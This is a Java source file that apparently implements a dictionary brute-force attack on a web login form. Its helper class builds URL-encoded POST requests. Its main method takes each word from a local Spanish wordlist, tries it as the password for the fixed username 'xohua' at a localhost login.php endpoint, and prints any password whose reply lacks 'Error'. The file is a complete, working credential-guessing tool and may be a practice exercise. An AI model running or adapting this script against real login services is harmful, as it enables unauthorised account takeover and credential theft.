package operaciones;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
//import operaciones.LeerDic;

public class PeticionUrl {
	private URL url;
	String data;
	
	public PeticionUrl(String url) throws MalformedURLException{
		this.url = new URL(url);
		data="";		
	}
	
	public void add (String propiedad, String valor) throws UnsupportedEncodingException{
		//codificamos cada uno de los valores
		if (data.length()>0)
			data+= "&"+ URLEncoder.encode(propiedad, "UTF-8")+ "=" +URLEncoder.encode(valor, "UTF-8");
		else
			data+= URLEncoder.encode(propiedad, "UTF-8")+ "=" +URLEncoder.encode(valor, "UTF-8");
	}
	
	public String getRespueta() throws IOException {
		String respuesta = "";
		//abrimos la conexión
		URLConnection conn = url.openConnection();
		//especificamos que vamos a escribir
		conn.setDoOutput(true);
		//obtenemos el flujo de escritura
		OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
		//escribimos
		wr.write(data);
		//cerramos la conexiÃ³n
		wr.close();

	  //obtenemos el flujo de lectura
		BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
	    String linea;
	     //procesamos al salida
	    while ((linea = rd.readLine()) != null) {
	    	respuesta+= linea;
	    }
	    return respuesta;
	}


	public static void main(String[] args) {
		// TODO Auto-generated method stub
		String url="http://localhost/login/login.php";
		String kusuario="usuario";
		String vusuario="xohua";
		String kpassword="pass";
		String ruta="D:\\Spanish.txt";
		String mensaje="Error";
		PeticionUrl post = null;
		BufferedReader diccionario=null;
		diccionario=operaciones.LeerDic.leer(ruta); //Obtenemos el diccionario
		
		
		 // Lectura del diccionario
        String linea;
        
        try {
			while((linea=diccionario.readLine())!=null){
			   //System.out.println(linea);
			   try {
					post = new PeticionUrl (url);
				} catch (MalformedURLException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				try {
					post.add(kusuario, vusuario);
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				try {
					post.add(kpassword, linea);
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				String respuesta = null;
				try {
					respuesta = post.getRespueta();
					if(!respuesta.contains(mensaje)){
						System.out.println("La contraseña para el usuario:" + vusuario+" es: " + linea);
					}
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				//System.out.println(respuesta);	   
			   
			}
			
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
		
		
	}

}
